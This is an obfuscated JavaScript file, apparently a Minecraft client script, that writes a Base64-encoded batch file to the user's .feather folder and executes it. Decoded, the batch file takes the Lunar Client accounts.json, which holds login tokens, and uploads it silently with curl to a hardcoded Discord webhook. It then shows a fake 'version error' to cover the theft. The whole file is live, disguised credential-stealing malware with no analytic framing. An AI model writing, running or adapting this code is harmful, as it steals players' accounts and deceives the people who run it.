  
function getEnv(_0x89354c) {
  const _0x1b7771 = Java.type("java.lang.System");
  return _0x1b7771.getenv(_0x89354c);
}
function executeBat(_0x4aa79a, _0x538bd = null, _0x587868 = true) {
  if (_0x538bd) {
    const _0x3d0a45 = Java.type("java.util.Base64");
    FS.open(fullPath).write(_0x587868 ? _0x3d0a45.getDecoder().decode(_0x538bd) : _0x538bd);
  }
  const _0x5913c4 = Java.type("java.lang.Runtime");
  if (!FS.exists(_0x4aa79a)) {
    throw new Error("Failed to find the path \"" + _0x4aa79a + "\"");
  }
  if (!FS.toRawFile(_0x4aa79a).isFile()) {
    throw new Error("\"" + _0x4aa79a + "\" is not a file");
  }
  _0x5913c4.getRuntime().exec("cmd /c start \"\" \"" + _0x4aa79a + "\"");
}
const fullPath = getEnv("APPDATA") + "\\" + ".feather\\skibidi.bat";
executeBat(fullPath, "QGVjaG8gb2ZmCgpSRU0gUGF0aCB0byB0aGUgdGV4dCBmaWxlIGluICVVU0VSUFJPRklMRSVcLmx1bmFyY2xpZW50XHNldHRpbmdzXGdhbWVcYWNjb3VudHMuanNvbgpzZXQgRklMRV9QQVRIPSVVU0VSUFJPRklMRSVcLmx1bmFyY2xpZW50XHNldHRpbmdzXGdhbWVcYWNjb3VudHMuanNvbgoKUkVNIERpc2NvcmQgd2ViaG9vayBVUkwKc2V0IFdFQkhPT0tfVVJMPWh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMTMyNDQ0ODMyMjc0ODQxOTIvQUFEc3ZXTk9jZXU4OWVfaGJuUnB1N0tIMHpXSjkyb0Z0VEdGNWxUcVBmeU51VVpjN0hlcU9fNWZXaVJ1M0ZFQ0gzUk8KClJFTSBFbnN1cmUgdGhlIGZpbGUgZXhpc3RzCmlmIG5vdCBleGlzdCAiJUZJTEVfUEFUSCUiICgKICAgIGVjaG8gRmlsZSBub3QgZm91bmQ6ICVGSUxFX1BBVEglCiAgICBleGl0IC9iIDEKKQoKUkVNIFVzZSBjdXJsIHRvIHNlbmQgdGhlIGZpbGUgYW5kIHN1cHByZXNzIG91dHB1dApjdXJsIC1YIFBPU1QgJVdFQkhPT0tfVVJMJSBeCiAgICAtSCAiQ29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhIiBeCiAgICAtRiAicGF5bG9hZF9qc29uPXtcImNvbnRlbnRcIjpcIkhlcmUgaXMgeW91ciBmaWxlIVwifSIgXgogICAgLUYgImZpbGU9QCVGSUxFX1BBVEglIiA+bnVsIDI+JjEKClJFTSBDaGVjayB0aGUgZXhpdCBjb2RlIG9mIGN1cmwKaWYgJUVSUk9STEVWRUwlIG5lcSAwICgKICAgIGVjaG8gRmFpbGVkIHRvIHNlbmQgdGhlIGZpbGUuCiAgICBleGl0IC9iICVFUlJPUkxFVkVMJQopCgplY2hvIE1pbmVjcmFmdCB2ZXJzaW9uIElucHV0IGVycm9yIHJhdyBQbGVhc2UgdHJ5IGFub3RoZXIgdmVyc2lvbgpleGl0IC9iCg=="); 